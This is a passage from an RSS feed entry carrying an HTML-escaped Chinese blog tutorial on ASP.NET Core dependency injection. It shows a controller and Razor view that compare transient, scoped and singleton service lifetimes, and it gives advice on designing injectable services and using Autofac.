        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; OperationController(IOperationTransient operationTransient,
            IOperationScoped operationScoped,
            IOperationSingleton operationSingleton,
            IOperationInstance operationInstance,
            OperationServices operationServices)
        {
            OperationTransient &lt;/span&gt;=&lt;span&gt; operationTransient;
            OperationScoped &lt;/span&gt;=&lt;span&gt; operationScoped;
            OperationSingleton &lt;/span&gt;=&lt;span&gt; operationSingleton;
            OperationInstance &lt;/span&gt;=&lt;span&gt; operationInstance;
            _operationServices &lt;/span&gt;=&lt;span&gt; operationServices;
        }
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; GET: Operation&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt;&lt;span&gt; ActionResult Index()
        {
            ViewBag.OperationTransient &lt;/span&gt;=&lt;span&gt; OperationTransient;
            ViewBag.OperationScoped &lt;/span&gt;=&lt;span&gt; OperationScoped;
            ViewBag.OperationSingleton &lt;/span&gt;=&lt;span&gt; OperationSingleton;
            ViewBag.OperationInstance &lt;/span&gt;=&lt;span&gt; OperationInstance;
            ViewBag._operationServices &lt;/span&gt;=&lt;span&gt; _operationServices;
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; View();
        }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　6.Index显示&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;@{
    ViewData[&quot;Title&quot;] = &quot;Index&quot;;
}

&lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;div&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;h1&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;Controller Operations&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;h1&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;h2&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;OperationTransient: @ViewBag.OperationTransient.OperationId&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;h2&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;h2&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;OperationScoped: @ViewBag.OperationScoped.OperationId&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;h2&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;h2&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;OperationSingleton: @ViewBag.OperationSingleton.OperationId&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;h2&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;h2&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;OperationInstance: @ViewBag.OperationInstance.OperationId&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;h2&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;div&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;div&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;h1&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;Services Operations&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;h1&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;h2&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;OperationTransient: @ViewBag._operationServices.OperationTransient.OperationId&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;h2&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;h2&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;OperationScoped: @ViewBag._operationServices.OperationScoped.OperationId&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;h2&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;h2&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;OperationSingleton: @ViewBag._operationServices.OperationSingleton.OperationId&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;h2&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;h2&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;OperationInstance: @ViewBag._operationServices.OperationInstance.OperationId&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;h2&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;div&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;　　7.运行结果&lt;/p&gt;
&lt;p&gt;　　　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/984232/201905/984232-20190520215438252-395341455.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　　　可以看到，单例生命周期服务每一次请求的标识一样。作用域生命周期的服务，在一次请求中使用的同一个实例，第二次请求创建新的实例。&lt;/p&gt;

&lt;p&gt;　　&lt;span&gt;&lt;strong&gt;5.请求服务&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　来自HttpContext的一次ASP.NET 请求中，可用的服务是通过&lt;a href=&quot;https://docs.microsoft.com/en-us/dotnet/api/microsoft.aspnetcore.http.httpcontext.requestservices?view=aspnetcore-2.2&quot; target=&quot;_blank&quot;&gt;RequestServices&lt;/a&gt;集合公开的。&lt;/p&gt;
&lt;p&gt;　　请求服务将你配置的服务和请求描述为应用程序的一部分。在子的对象指定依赖之后，这些满足要求的对象可通过查找RequestServices中对应的类型得到，而不是ApplicationServices。&lt;/p&gt;

&lt;p&gt;　　&lt;span&gt;&lt;strong&gt;6.设计依赖注入服务&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　在自定义的服务中，避免使用静态方法和直接实例化依赖的类型，而是通过依赖注入请求它。（New is Glue）&lt;/p&gt;
&lt;p&gt;　　如果类有太多的依赖关系被注入时，通常表明你的类试图做的太多（违反了单一职责原则），需要转移一些职责。&lt;/p&gt;
&lt;p&gt;　　同样，Controller类应该重点关注UI，因此业务逻辑和数据访问等细节应该在其他类中。&lt;/p&gt;

&lt;p&gt;　　&lt;span&gt;&lt;strong&gt;7.使用Autofac容器&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;a href=&quot;https://autofaccn.readthedocs.io/zh/latest/&quot; target=&quot;_blank&quot;&gt;Autofac&lt;/a&gt;&lt;/p&gt;

</description>
<pubDate>Wed, 22 May 2019 13:09:00 +0000</pubDate>
<dc:creator>卡西莫多_Ruby</dc:creator>
<og:description>ASP.NET Core的底层设计支持和使用依赖注入。ASP.NET Core 应用程序可以利用内置的框架服务将服务注入到启动类的方法中，并且应用程序服务也可以配置注入。由ASP.NET Core 提</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/afei-24/p/10885044.html</dc:identifier>
</item>
</channel>
</rss>